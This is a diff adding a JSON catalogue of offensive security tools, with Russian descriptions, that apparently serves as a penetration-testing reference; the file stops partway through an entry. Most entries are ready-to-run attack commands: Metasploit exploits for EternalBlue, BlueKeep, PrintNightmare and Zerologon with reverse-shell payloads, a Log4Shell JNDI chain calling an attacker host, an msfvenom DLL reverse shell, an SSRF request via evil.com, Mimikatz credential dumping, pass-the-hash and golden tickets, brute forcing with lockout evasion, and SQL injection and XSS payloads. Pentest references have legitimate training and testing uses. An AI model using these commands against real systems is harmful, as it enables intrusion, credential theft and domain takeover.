@@ -1,0 +1,1916 @@
+[
+  {
+    "id": "TOOL-001",
+    "name": "Metasploit Framework",
+    "type": "exploitation",
+    "description": "Мощная платформа для разработки и выполнения эксплойтов",
+    "url": "https://www.metasploit.com/",
+    "applicable_attack_types": ["remote_code_execution", "privilege_escalation", "brute_force"],
+    "applicable_cve": ["CVE-2017-0144", "CVE-2019-0708", "CVE-2021-44228", "CVE-2021-34527", "CVE-2020-1472"],
+    "commands": {
+      "CVE-2017-0144": [
+        "# EternalBlue (MS17-010) через Metasploit",
+        "msfconsole -q",
+        "use exploit/windows/smb/ms17_010_eternalblue",
+        "set RHOSTS <TARGET_IP>",
+        "set LHOST <YOUR_IP>",
+        "set LPORT 4444",
+        "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
+        "run"
+      ],
+      "CVE-2019-0708": [
+        "# BlueKeep RDP RCE через Metasploit",
+        "msfconsole -q",
+        "use exploit/windows/rdp/cve_2019_0708_bluekeep_rce",
+        "set RHOSTS <TARGET_IP>",
+        "set LHOST <YOUR_IP>",
+        "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
+        "run"
+      ],
+      "CVE-2021-34527": [
+        "# PrintNightmare через Metasploit",
+        "msfconsole -q",
+        "use exploit/windows/dcerpc/cve_2021_1675_printspooler",
+        "set RHOSTS <TARGET_IP>",
+        "set LHOST <YOUR_IP>",
+        "set SMBUSER <USERNAME>",
+        "set SMBPASS <PASSWORD>",
+        "run"
+      ],
+      "CVE-2020-1472": [
+        "# Zerologon через Metasploit",
+        "msfconsole -q",
+        "use auxiliary/admin/dcerpc/cve_2020_1472_zerologon",
+        "set RHOSTS <DC_IP>",
+        "set NBNAME <DOMAIN_CONTROLLER_NAME>",
+        "run"
+      ]
+    },
+    "phases": ["Scanning", "Exploitation", "Post-Exploitation"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-002",
+    "name": "Nmap",
+    "type": "scanning",
+    "description": "Утилита сетевого сканирования и обнаружения уязвимостей",
+    "url": "https://nmap.org/",
+    "applicable_attack_types": ["reconnaissance", "network_scanning"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Быстрое сканирование портов",
+        "nmap -sV -sC -O <TARGET_IP>",
+        "",
+        "# Агрессивное сканирование",
+        "nmap -A -T4 <TARGET_IP>",
+        "",
+        "# Поиск уязвимостей с помощью NSE-скриптов",
+        "nmap --script vuln <TARGET_IP>",
+        "",
+        "# Сканирование конкретного порта",
+        "nmap -p 445 --script smb-vuln-ms17-010 <TARGET_IP>",
+        "",
+        "# Сканирование диапазона портов",
+        "nmap -p 1-65535 -sV <TARGET_IP>"
+      ]
+    },
+    "phases": ["Reconnaissance", "Scanning"],
+    "skill_level": "Beginner",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-003",
+    "name": "SQLmap",
+    "type": "exploitation",
+    "description": "Автоматизированный инструмент для обнаружения и эксплуатации SQL-инъекций",
+    "url": "https://sqlmap.org/",
+    "applicable_attack_types": ["sql_injection"],
+    "applicable_cve": ["CVE-GENERIC-SQLI"],
+    "commands": {
+      "CVE-GENERIC-SQLI": [
+        "# Базовое тестирование SQL-инъекции",
+        "sqlmap -u \"http://<TARGET_IP>/page?id=1\" --dbs",
+        "",
+        "# Получение всех таблиц базы данных",
+        "sqlmap -u \"http://<TARGET_IP>/page?id=1\" -D <DB_NAME> --tables",
+        "",
+        "# Дамп конкретной таблицы",
+        "sqlmap -u \"http://<TARGET_IP>/page?id=1\" -D <DB_NAME> -T <TABLE_NAME> --dump",
+        "",
+        "# Попытка получить OS shell",
+        "sqlmap -u \"http://<TARGET_IP>/page?id=1\" --os-shell",
+        "",
+        "# Тестирование POST-запроса",
+        "sqlmap -u \"http://<TARGET_IP>/login\" --data=\"user=admin&pass=test\" --dbs"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Beginner",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-004",
+    "name": "Hydra",
+    "type": "brute_force",
+    "description": "Быстрый онлайн-инструмент для перебора паролей (brute force)",
+    "url": "https://github.com/vanhauser-thc/thc-hydra",
+    "applicable_attack_types": ["brute_force"],
+    "applicable_cve": ["CVE-GENERIC-BRUTEFORCE-RDP", "CVE-GENERIC-BRUTEFORCE-FTP", "CVE-GENERIC-BRUTEFORCE-SSH"],
+    "commands": {
+      "CVE-GENERIC-BRUTEFORCE-RDP": [
+        "# Brute Force RDP (порт 3389)",
+        "hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<TARGET_IP>",
+        "",
+        "# Со списком логинов",
+        "hydra -L users.txt -P passwords.txt rdp://<TARGET_IP>:3389"
+      ],
+      "CVE-GENERIC-BRUTEFORCE-FTP": [
+        "# Brute Force FTP (порт 21)",
+        "hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>",
+        "",
+        "# С задержкой между попытками",
+        "hydra -l admin -P passwords.txt -t 4 -W 3 ftp://<TARGET_IP>"
+      ],
+      "CVE-GENERIC-BRUTEFORCE-SSH": [
+        "# Brute Force SSH (порт 22)",
+        "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>",
+        "",
+        "# С задержкой для обхода блокировки",
+        "hydra -l admin -P passwords.txt -t 4 -W 5 ssh://<TARGET_IP>"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Beginner",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-005",
+    "name": "Burp Suite",
+    "type": "web_testing",
+    "description": "Комплексная платформа тестирования безопасности веб-приложений",
+    "url": "https://portswigger.net/burp",
+    "applicable_attack_types": ["cross_site_scripting", "sql_injection", "remote_code_execution"],
+    "applicable_cve": ["CVE-GENERIC-XSS", "CVE-GENERIC-SQLI"],
+    "commands": {
+      "CVE-GENERIC-XSS": [
+        "# Запуск Burp Suite как прокси",
+        "# 1. Запустите Burp Suite Community/Professional",
+        "# 2. Настройте браузер на прокси 127.0.0.1:8080",
+        "# 3. Перехватывайте и модифицируйте запросы",
+        "",
+        "# XSS тест-полезная нагрузка для ручного ввода:",
+        "<script>alert('XSS')</script>",
+        "<img src=x onerror=alert('XSS')>",
+        "\"><svg onload=alert(1)>",
+        "';alert('XSS');//"
+      ],
+      "CVE-GENERIC-SQLI": [
+        "# SQL инъекция через Burp Intruder:",
+        "# 1. Перехватите запрос с параметром",
+        "# 2. Отправьте в Intruder",
+        "# 3. Используйте полезные нагрузки SQL:",
+        "' OR 1=1--",
+        "' OR '1'='1",
+        "1; DROP TABLE users--",
+        "' UNION SELECT 1,2,3--"
+      ]
+    },
+    "phases": ["Reconnaissance", "Exploitation"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-006",
+    "name": "Mimikatz",
+    "type": "post_exploitation",
+    "description": "Инструмент для извлечения учётных данных из памяти Windows",
+    "url": "https://github.com/gentilkiwi/mimikatz",
+    "applicable_attack_types": ["credential_dumping", "privilege_escalation"],
+    "applicable_cve": ["CVE-2020-1472", "CVE-2021-34527", "CVE-2023-23397"],
+    "commands": {
+      "default": [
+        "# Запуск Mimikatz с правами администратора",
+        "privilege::debug",
+        "sekurlsa::logonpasswords",
+        "",
+        "# Извлечение хешей NTLM из SAM",
+        "lsadump::sam",
+        "",
+        "# Дамп LSA секретов",
+        "lsadump::secrets",
+        "",
+        "# Pass-the-Hash атака",
+        "sekurlsa::pth /user:<USERNAME> /domain:<DOMAIN> /ntlm:<NTLM_HASH> /run:cmd.exe",
+        "",
+        "# Golden Ticket (требуется hash krbtgt)",
+        "kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<HASH> /id:500"
+      ]
+    },
+    "phases": ["Post-Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Windows"]
+  },
+  {
+    "id": "TOOL-007",
+    "name": "impacket / zerologon",
+    "type": "exploitation",
+    "description": "Python-библиотека для работы с сетевыми протоколами Windows + exploit Zerologon",
+    "url": "https://github.com/SecureAuthCorp/impacket",
+    "applicable_attack_types": ["privilege_escalation"],
+    "applicable_cve": ["CVE-2020-1472"],
+    "commands": {
+      "CVE-2020-1472": [
+        "# Установка impacket",
+        "pip install impacket",
+        "",
+        "# Проверка уязвимости Zerologon",
+        "python3 zerologon_tester.py <DC_HOSTNAME> <DC_IP>",
+        "",
+        "# Эксплуатация — сброс пароля DC",
+        "python3 cve-2020-1472-exploit.py <DC_HOSTNAME> <DC_IP>",
+        "",
+        "# После эксплуатации — дамп хешей через secretsdump",
+        "python3 secretsdump.py -no-pass -just-dc <DOMAIN>/<DC_HOSTNAME>\\$@<DC_IP>",
+        "",
+        "# Восстановление пароля (для учебной среды!)",
+        "python3 restorepassword.py <DOMAIN>/<DC_HOSTNAME>@<DC_IP> -target-ip <DC_IP> -hexpass <ORIGINAL_HASH>"
+      ]
+    },
+    "phases": ["Exploitation", "Post-Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-008",
+    "name": "Log4Shell PoC",
+    "type": "exploitation",
+    "description": "Инструмент для тестирования уязвимости Log4Shell (CVE-2021-44228)",
+    "url": "https://github.com/woodpecker-appstore/log4j-payload-generator",
+    "applicable_attack_types": ["remote_code_execution"],
+    "applicable_cve": ["CVE-2021-44228"],
+    "commands": {
+      "CVE-2021-44228": [
+        "# Шаг 1: Запустите LDAP-сервер (marshalsec)",
+        "java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer \"http://<YOUR_IP>:8888/#Exploit\"",
+        "",
+        "# Шаг 2: Создайте payload класс (Exploit.java)",
+        "# public class Exploit { static { try { Runtime.getRuntime().exec(\"calc.exe\"); } catch (Exception e) {} } }",
+        "javac Exploit.java",
+        "",
+        "# Шаг 3: Хостите класс на HTTP",
+        "python3 -m http.server 8888",
+        "",
+        "# Шаг 4: Отправьте JNDI payload в уязвимое поле",
+        "curl -H 'X-Api-Version: ${jndi:ldap://<YOUR_IP>:1389/Exploit}' http://<TARGET_IP>/",
+        "",
+        "# Альтернативный вектор — User-Agent",
+        "curl -A '${jndi:ldap://<YOUR_IP>:1389/Exploit}' http://<TARGET_IP>/"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-009",
+    "name": "PrintNightmare PoC (cube0x0)",
+    "type": "exploitation",
+    "description": "Эксплойт PrintNightmare для локального/удалённого выполнения кода",
+    "url": "https://github.com/cube0x0/CVE-2021-1675",
+    "applicable_attack_types": ["remote_code_execution"],
+    "applicable_cve": ["CVE-2021-34527"],
+    "commands": {
+      "CVE-2021-34527": [
+        "# Установка зависимостей",
+        "pip3 install impacket",
+        "",
+        "# Проверка уязвимости",
+        "rpcdump.py @<TARGET_IP> | grep -A 4 'MS-RPRN'",
+        "",
+        "# Создание вредоносной DLL (msfvenom)",
+        "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f dll -o shell.dll",
+        "",
+        "# Хостим DLL через SMB (impacket)",
+        "python3 smbserver.py share . -smb2support",
+        "",
+        "# Запуск эксплойта",
+        "python3 CVE-2021-1675.py <DOMAIN>/<USER>:<PASS>@<TARGET_IP> '\\\\<YOUR_IP>\\share\\shell.dll'",
+        "",
+        "# Запуск Metasploit listener",
+        "msfconsole -q -x 'use multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST <YOUR_IP>; set LPORT 4444; run'"
+      ]
+    },
+    "phases": ["Exploitation", "Post-Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-010",
+    "name": "ProxyLogon PoC",
+    "type": "exploitation",
+    "description": "Эксплойт цепочки уязвимостей ProxyLogon в Microsoft Exchange",
+    "url": "https://github.com/proxylogon/proxylogon",
+    "applicable_attack_types": ["remote_code_execution"],
+    "applicable_cve": ["CVE-2021-26855"],
+    "commands": {
+      "CVE-2021-26855": [
+        "# Проверка уязвимости через curl",
+        "curl -sk 'https://<TARGET_IP>/ecp/y.js' --header 'Cookie: X-BEResource=localhost~1942061522' | grep 'The resource cannot be found'",
+        "",
+        "# Использование готового PoC",
+        "python3 proxylogon.py --host <TARGET_IP> --email <VICTIM_EMAIL>",
+        "",
+        "# Ручная проверка SSRF (CVE-2021-26855)",
+        "curl -sk 'https://<TARGET_IP>/autodiscover/autodiscover.json?@evil.com/autodiscover/autodiscover.json%3F@evil.com' -v",
+        "",
+        "# После SSRF — запись веб-шелла (CVE-2021-27065)",
+        "# Требуется почтовый ящик жертвы и сессия SSRF"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Expert",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-011",
+    "name": "Nessus / OpenVAS",
+    "type": "vulnerability_scanner",
+    "description": "Профессиональные сканеры уязвимостей для комплексного аудита",
+    "url": "https://www.tenable.com/products/nessus",
+    "applicable_attack_types": ["reconnaissance"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# OpenVAS (бесплатная альтернатива) — установка на Kali",
+        "sudo apt install openvas",
+        "sudo gvm-setup",
+        "sudo gvm-start",
+        "",
+        "# Доступ к веб-интерфейсу OpenVAS",
+        "# https://127.0.0.1:9392",
+        "",
+        "# Nessus CLI сканирование (требует лицензии)",
+        "nessuscli scan new --name 'Scan' --policy 'Basic Network Scan' --targets '<TARGET_IP>'"
+      ]
+    },
+    "phases": ["Reconnaissance", "Scanning"],
+    "skill_level": "Beginner",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-012",
+    "name": "Wireshark / tcpdump",
+    "type": "network_analysis",
+    "description": "Инструменты анализа сетевого трафика",
+    "url": "https://www.wireshark.org/",
+    "applicable_attack_types": ["man_in_the_middle", "reconnaissance"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# tcpdump — захват трафика на интерфейсе",
+        "tcpdump -i eth0 -w capture.pcap",
+        "",
+        "# Фильтр по хосту и порту",
+        "tcpdump -i eth0 host <TARGET_IP> and port 445 -w smb.pcap",
+        "",
+        "# Захват HTTP трафика",
+        "tcpdump -i eth0 -A port 80",
+        "",
+        "# Wireshark — открыть захват",
+        "wireshark capture.pcap"
+      ]
+    },
+    "phases": ["Reconnaissance"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-013",
+    "name": "Wireshark / tcpdump",
+    "type": "network_analysis",
+    "description": "Инструменты анализа сетевого трафика для перехвата и анализа пакетов",
+    "url": "https://www.wireshark.org/",
+    "applicable_attack_types": ["man_in_the_middle", "reconnaissance"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Захват трафика на интерфейсе (tcpdump)",
+        "tcpdump -i eth0 -w capture.pcap",
+        "",
+        "# Фильтр по хосту и порту",
+        "tcpdump -i eth0 host <TARGET_IP> and port 445 -w smb_traffic.pcap",
+        "",
+        "# Захват HTTP трафика в текстовом виде",
+        "tcpdump -i eth0 -A port 80",
+        "",
+        "# Анализ захваченного трафика в Wireshark",
+        "wireshark capture.pcap"
+      ]
+    },
+    "phases": ["Reconnaissance"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-014",
+    "name": "John the Ripper / Hashcat",
+    "type": "password_cracking",
+    "description": "Инструменты для взлома паролей через brute force и словарные атаки",
+    "url": "https://www.openwall.com/john/",
+    "applicable_attack_types": ["brute_force", "credential_dumping"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# John the Ripper - взлом NTLM хешей",
+        "john --format=NT hashes.txt",
+        "",
+        "# С использованием словаря",
+        "john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt",
+        "",
+        "# Hashcat - GPU-ускоренный взлом",
+        "hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt",
+        "",
+        "# Hashcat с маской (брутфорс)",
+        "hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a",
+        "",
+        "# Извлечение хешей из SAM файла (Windows)",
+        "samdump2 SYSTEM SAM > hashes.txt"
+      ]
+    },
+    "phases": ["Post-Exploitation"],
+    "skill_level": "Intermediate",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-015",
+    "name": "BloodHound",
+    "type": "reconnaissance",
+    "description": "Инструмент для анализа Active Directory и поиска путей повышения привилегий",
+    "url": "https://github.com/BloodHoundAD/BloodHound",
+    "applicable_attack_types": ["privilege_escalation"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Сбор данных для BloodHound (SharpHound)",
+        "# На целевой машине Windows:",
+        "SharpHound.exe -c All -d <DOMAIN>",
+        "",
+        "# Импорт данных в BloodHound",
+        "# Запустить neo4j и bloodhound-gui",
+        "sudo neo4j start",
+        "bloodhound",
+        "",
+        "# Анализ путей атаки в GUI",
+        "# 1. Загрузить JSON файлы",
+        "# 2. Найти кратчайшие пути к Domain Admins",
+        "# 3. Анализировать уязвимости Kerberos delegation"
+      ]
+    },
+    "phases": ["Reconnaissance", "Post-Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Windows", "Linux"]
+  },
+{
+    "id": "TOOL-016",
+    "name": "Empire / Covenant",
+    "type": "post_exploitation",
+    "description": "C2 (Command and Control) фреймворки для пост-эксплуатации",
+    "url": "https://github.com/EmpireProject/Empire",
+    "applicable_attack_types": ["remote_code_execution", "privilege_escalation"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Empire - запуск сервера",
+        "cd /opt/Empire",
+        "./empire",
+        "",
+        "# Создание listener",
+        "(Empire) > listeners",
+        "(Empire) > uselistener http",
+        "(Empire) > set Name http_listener",
+        "(Empire) > execute",
+        "",
+        "# Создание payload (stager)",
+        "(Empire) > usestager windows/launcher_bat",
+        "(Empire) > set Listener http_listener",
+        "(Empire) > execute",
+        "",
+        "# Работа с агентом после получения доступа",
+        "(Empire) > agents",
+        "(Empire) > interact <AGENT_NAME>",
+        "(Empire: <AGENT_NAME>) > shell whoami",
+        "(Empire: <AGENT_NAME>) > usemodule privesc/bypassuac"
+      ]
+    },
+    "phases": ["Exploitation", "Post-Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-017",
+    "name": "Nuclei",
+    "type": "vulnerability_scanner",
+    "description": "Fast template-based vulnerability scanner",
+    "url": "https://github.com/projectdiscovery/nuclei",
+    "applicable_attack_types": ["reconnaissance", "vulnerability_assessment"],
+    "applicable_cve": ["CVE-2021-44228", "CVE-2024-21413", "CVE-2024-23897", "CVE-2024-1709"],
+    "commands": {
+      "CVE-2021-44228": [
+        "# Сканирование Log4j",
+        "nuclei -u http://<TARGET_IP> -t CVE-2021-44228.yaml",
+        "",
+        "# Использование готовых шаблонов",
+        "nuclei -u http://<TARGET_IP> -tags cve,log4j"
+      ],
+      "CVE-2024-23897": [
+        "# Сканирование Jenkins",
+        "nuclei -u http://<TARGET_IP>:8080 -t CVE-2024-23897.yaml"
+      ],
+      "default": [
+        "# Базовое сканирование",
+        "nuclei -u http://<TARGET_IP>",
+        "",
+        "# Сканирование с конкретными шаблонами",
+        "nuclei -u http://<TARGET_IP> -t cves/2024/",
+        "",
+        "# Сканирование всей сети",
+        "nuclei -list targets.txt -o results.txt",
+        "",
+        "# Обновление шаблонов",
+        "nuclei -update-templates"
+      ]
+    },
+    "phases": ["Reconnaissance", "Scanning"],
+    "skill_level": "Beginner",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-018",
+    "name": "Goby",
+    "type": "vulnerability_scanner",
+    "description": "Веб-сканер уязвимостей нового поколения с эксплойтами",
+    "url": "https://gobies.org/",
+    "applicable_attack_types": ["reconnaissance", "vulnerability_assessment"],
+    "applicable_cve": ["CVE-2021-44228", "CVE-2024-3400", "CVE-2024-21413"],
+    "commands": {
+      "default": [
+        "# Установка (Linux)",
+        "wget https://github.com/gobysec/goby/releases/latest/download/goby-linux-x64.tar.gz",
+        "tar -xzf goby-linux-x64.tar.gz",
+        "./goby -mode server -bind 0.0.0.0 -port 8888",
+        "",
+        "# Сканирование через CLI",
+        "./goby -i <TARGET_IP> -j",
+        "",
+        "# Сканирование диапазона",
+        "./goby -i 192.168.1.0/24"
+      ]
+    },
+    "phases": ["Reconnaissance", "Scanning"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-019",
+    "name": "XSSer",
+    "type": "exploitation",
+    "description": "Автоматизированный инструмент для обнаружения и эксплуатации XSS",
+    "url": "https://github.com/epsylon/xsser",
+    "applicable_attack_types": ["cross_site_scripting"],
+    "applicable_cve": ["CVE-GENERIC-XSS"],
+    "commands": {
+      "CVE-GENERIC-XSS": [
+        "# Базовое сканирование",
+        "xsser http://<TARGET_IP>/",
+        "",
+        "# С POST данными",
+        "xsser http://<TARGET_IP>/login --data='username=admin&password=test'",
+        "",
+        "# С прокси",
+        "xsser http://<TARGET_IP>/ --proxy=http://127.0.0.1:8080",
+        "",
+        "# С готовыми векторами",
+        "xsser http://<TARGET_IP>/ --auto"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Beginner",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-020",
+    "name": "Commix",
+    "type": "exploitation",
+    "description": "Автоматизированный инструмент для обнаружения и эксплуатации Command Injection",
+    "url": "https://github.com/commixproject/commix",
+    "applicable_attack_types": ["command_injection"],
+    "applicable_cve": ["CVE-GENERIC-CMDINJ"],
+    "commands": {
+      "default": [
+        "# Базовое сканирование",
+        "commix http://<TARGET_IP>/vulnerable.php?id=1",
+        "",
+        "# С POST данными",
+        "commix http://<TARGET_IP>/login --data='user=admin'",
+        "",
+        "# Проверка всех параметров",
+        "commix http://<TARGET_IP>/search --level=2",
+        "",
+        "# С OAuth прокси",
+        "commix http://<TARGET_IP>/ --proxy=http://127.0.0.1:8080"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Intermediate",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-021",
+    "name": "CVE-2025-55182 PoC (React2Shell)",
+    "type": "exploitation",
+    "description": "Эксплойт для уязвимости React Server Components RCE",
+    "url": "https://github.com/ejpir/CVE-2025-55182-poc",
+    "applicable_attack_types": ["remote_code_execution"],
+    "applicable_cve": ["CVE-2025-55182"],
+    "commands": {
+      "CVE-2025-55182": [
+        "# Пример эксплуатации React2Shell (Next.js)",
+        "",
+        "# Вариант 1: Простой PoC",
+        "curl -X POST http://<TARGET_IP>/_next/server_actions",
+        "-H 'Content-Type: text/plain;charset=UTF-8'",
+        "-d '{\"body\":\"console.log(1)\"}'",
+        "",
+        "# Вариант 2: С использованием RCE",
+        "# Требует настройки вредоносного сервера",
+        "# Загрузить и модифицировать PoC с GitHub",
+        "",
+        "# Определение уязвимой версии Next.js",
+        "curl -I http://<TARGET_IP>/_next/static/*"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Expert",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-022",
+    "name": "CVE-2024-1709 PoC (ConnectWise ScreenConnect)",
+    "type": "exploitation",
+    "description": "Эксплойт для обхода аутентификации ConnectWise ScreenConnect",
+    "url": "https://www.connectwise.com/company/trust/security-bulletins",
+    "applicable_attack_types": ["authentication_bypass"],
+    "applicable_cve": ["CVE-2024-1709"],
+    "commands": {
+      "CVE-2024-1709": [
+        "# Обход аутентификации через изменение URL",
+        "curl -k 'https://<TARGET_IP>/ScreenConnect/Home.aspx?InstallType=Add'",
+        "",
+        "# Использование эксплойта",
+        "python3 screenconnect_auth_bypass.py <TARGET_IP>"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Intermediate",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-023",
+    "name": "CVE-2024-23897 PoC (Jenkins)",
+    "type": "exploitation",
+    "description": "Эксплойт для RCE в Jenkins через CLI",
+    "url": "https://github.com/Wuyihong/Jenkins-CVE-2024-23897",
+    "applicable_attack_types": ["remote_code_execution"],
+    "applicable_cve": ["CVE-2024-23897"],
+    "commands": {
+      "CVE-2024-23897": [
+        "# Чтение файла через CLI",
+        "java -jar jenkins-cli.jar -s http://<TARGET_IP>:8080/ groovy = 'new File(\"/etc/passwd\").text'",
+        "",
+        "# RCE через скрипт",
+        "java -jar jenkins-cli.jar -s http://<TARGET_IP>:8080/ groovy = '\"ping -c 4 <YOUR_IP>\".execute()'",
+        "",
+        "# Загрузка и выполнение эксплойта",
+        "git clone https://github.com/Wuyihong/Jenkins-CVE-2024-23897.git",
+        "python3 CVE-2024-23897.py --target http://<TARGET_IP>:8080 --cmd 'whoami'"
+      ]
+    },
+    "phases": ["Exploitation"],
+    "skill_level": "Advanced",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-024",
+    "name": "RustScan",
+    "type": "scanning",
+    "description": "Быстрый сканер портов как замена Nmap",
+    "url": "https://github.com/RustScan/RustScan",
+    "applicable_attack_types": ["reconnaissance", "network_scanning"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Быстрое сканирование",
+        "rustscan -b 1000 -u 5000 <TARGET_IP>",
+        "",
+        "# Сканирование с Nmap выводом",
+        "rustscan -a <TARGET_IP> -- -sV -sC -oA scan_results",
+        "",
+        "# сканирование диапазона",
+        "rustscan -b 1500 -g 192.168.1.0/24"
+      ]
+    },
+    "phases": ["Reconnaissance", "Scanning"],
+    "skill_level": "Beginner",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-025",
+    "name": "feroxbuster",
+    "type": "reconnaissance",
+    "description": "Быстрый и простой фаззинг директорий",
+    "url": "https://github.com/epi052/feroxbuster",
+    "applicable_attack_types": ["reconnaissance"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Базовый фаззинг",
+        "feroxbuster -u http://<TARGET_IP>",
+        "",
+        "# С фильтрацией статус-кодов",
+        "feroxbuster -u http://<TARGET_IP> -s 200 301 302",
+        "",
+        "# СDepth и расширениями",
+        "feroxbuster -u http://<TARGET_IP> -d 3 -x php html js txt",
+        "",
+        "# С прокси",
+        "feroxbuster -u http://<TARGET_IP> --proxy http://127.0.0.1:8080"
+      ]
+    },
+    "phases": ["Reconnaissance"],
+    "skill_level": "Beginner",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-026",
+    "name": "CVE-2024-3094 (XZ Utils Backdoor) Detection",
+    "type": "detection",
+    "description": "Обнаружение бэкдора в XZ Utils",
+    "url": "https://github.com/ytl-dd/xz-backdoor-detection",
+    "applicable_attack_types": ["backdoor_detection"],
+    "applicable_cve": ["CVE-2024-3094"],
+    "commands": {
+      "CVE-2024-3094": [
+        "# Проверка версии xz",
+        "xz --version",
+        "",
+        "# Проверка через SSH",
+        "ssh -v localhost",
+        "# Смотрите на строку 'debug1: remote protocol version'",
+        "",
+        "# Проверка через ldd",
+        "ldd /usr/bin/xz | grep liblzma",
+        "",
+        "# Скрипт обнаружения",
+        "wget https://raw.githubusercontent.com/ytl-dd/xz-backdoor-detection/main/detect.sh",
+        "bash detect.sh"
+      ]
+    },
+    "phases": ["Detection"],
+    "skill_level": "Intermediate",
+    "os": ["Linux"]
+  },
+  {
+    "id": "TOOL-027",
+    "name": "Chainsaw",
+    "type": "post_exploitation",
+    "description": "Быстрый поиск по логам Windows и обнаружение угроз",
+    "url": "https://github.com/WithSecureLabs/chainsaw",
+    "applicable_attack_types": ["forensics", "threat_detection"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Анализ EVTX логов",
+        "chainsaw hunt <LOG_DIR> --rules rules/",
+        "",
+        "# Поиск по SID",
+        "chainsaw search <LOG_DIR> -f 'Event.System.EventID=4624'",
+        "",
+        "# Использование правил Sigma",
+        "chainsaw sigma --rules sigma_rules/ <LOG_DIR>"
+      ]
+    },
+    "phases": ["Post-Exploitation", "Detection"],
+    "skill_level": "Advanced",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-028",
+    "name": "Kerbrute",
+    "type": "reconnaissance",
+    "description": "Перечисление пользователей Kerberos и брутфорс",
+    "url": "https://github.com/ropnop/kerbrute",
+    "applicable_attack_types": ["reconnaissance", "brute_force"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Перечисление пользователей",
+        "kerbrute userenum -d <DOMAIN> --dc <DC_IP> users.txt",
+        "",
+        "# Брутфорс паролей",
+        "kerbrute brute -d <DOMAIN> --dc <DC_IP> -u <USER> passwords.txt",
+        "",
+        "# Брутфорс с списком пользователей",
+        "kerbrute brute -d <DOMAIN> --dc <DC_IP> -U users.txt -P passwords.txt"
+      ]
+    },
+    "phases": ["Reconnaissance", "Exploitation"],
+    "skill_level": "Intermediate",
+    "os": ["Linux", "Windows"]
+  },
+  {
+    "id": "TOOL-029",
+    "name": "Pypykatz",
+    "type": "post_exploitation",
+    "description": "Mimikatz на Python для дампа учётных данных",
+    "url": "https://github.com/skelsec/pypykatz",
+    "applicable_attack_types": ["credential_dumping"],
+    "applicable_cve": [],
+    "commands": {
+      "default": [
+        "# Дамп из LSASS через минидамп",
+        "pypykatz lsa minidump /path/to/lsass.DMP",
+        "",
+        "# Live дамп (требует высокие привилегии)",
+        "pypykatz lsa live",
+        "",
+        "# Дамп из SAM hives",
+        "pypykatz registry -- hives",
+        "",
+        "# Парсинг lsass дампа с MiniDumpWriteDump",
+        "pypykatz minidump /path/to/dumpfile"
+      ]
+    },
+    "phases": ["Post-Exploitation"],
+    "skill_level": "Advanced",
